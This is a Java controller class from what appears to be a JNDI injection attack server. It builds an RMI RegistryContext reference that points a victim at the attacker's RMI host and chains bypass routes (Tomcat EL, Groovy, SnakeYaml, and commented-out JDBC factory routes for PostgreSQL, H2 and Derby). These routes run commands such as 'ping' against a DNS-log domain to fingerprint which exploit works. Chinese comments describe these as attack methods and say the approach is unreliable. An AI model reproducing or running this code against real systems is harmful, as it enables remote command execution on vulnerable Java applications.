package cn.butler.jndi.controller;

import cn.butler.jndi.JndiConfig;
import cn.butler.jndi.annotation.JNDIController;
import cn.butler.jndi.annotation.JNDIMapping;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.util.*;

/**
 * 这种打法我测试的时候发现问题还蛮多的，所以最后不打算使用
 */
@JNDIController
@JNDIMapping("/RegistryContext")
public class FindRMIURIController implements Controller {

    private LinkedList<String> factoryList = new LinkedList<>(Arrays.asList(
        "CommonsDBCP1", "CommonsDBCP2", "TomcatDBCP1", "TomcatDBCP2", "Druid", "HikariCP"
    ));

    /*
     * Fuzz All Bypass
     * Study by 藏青
     */
    public ResourceRef process(String dnslog){
        ResourceRef ref = new ResourceRef("RegistryContext", null, "", "",
            true, "com.sun.jndi.rmi.registry.RegistryContextFactory", null);
        Iterator<String> iterator = getRmiURLList(dnslog).iterator();
        while(iterator.hasNext()) {
            String element = iterator.next();
            //如果是RegistryContextFactory则跳过，否则会造成递归查询
            if(!element.startsWith("RegistryContext")){
                ref.add(new StringRefAddr("URL",String.format("rmi://%s:%s/%s", JndiConfig.ip,JndiConfig.rmiPort,element)));
            }
        }
        return ref;
    }

    @JNDIMapping("/{dnslog}")
    public String findRmiURL(String dnslog) {
        System.out.println("[RegistryContextFactory] Find RMIURL By DNSLOG: " + dnslog);
        return dnslog;
    }

    private LinkedList<String> getRmiURLList(String dnslog){
        LinkedList<String> linkedList = new LinkedList<String>();

        // ObjectFactory在目标环境中不存在不会抛出NamingException，所以JDBC系列的Factory打法不集成
        // JDBC系列的Factory打法: CommonsDBCP1/CommonsDBCP2/TomcatDBCP1/TomcatDBCP2/Druid/HikariCP
//        for (String factory : factoryList){
//            //linkedList.add(String.format("%s/MySQL/Deserialize1/127.0.0.1/3306/root",factory));
//            linkedList.add(String.format("%s/PostgreSQL/Command/ping %s",factory,"PostgreSQL."+dnslog));
//            linkedList.add(String.format("%s/H2/Java/ping %s",factory,"H2."+dnslog));
//            linkedList.add(String.format("%s/Derby/Command/SystemDataBase/ping %s",factory,"Derby."+dnslog));
//        }
        //todo Basic形式的DNSLog不够完善
        linkedList.add(String.format("Basic/DNSLog/%s","Basic."+dnslog)); //JNDI-RMI基本打法
        linkedList.add(String.format("TomcatBypass/Command/ping %s","TomcatBypass"+dnslog)); //JNDI-BeanFactory-TomcatEL打法
        linkedList.add(String.format("GroovyClassLoader/Command/ping %s","GroovyClassLoader."+dnslog)); //JNDI-BeanFctory-Groovy打法
        linkedList.add(String.format("SnakeYaml/Command/ping %s","SnakeYaml."+dnslog)); //JNDI-BeanFctory-SnakeYaml打法
        return linkedList;
    }
}
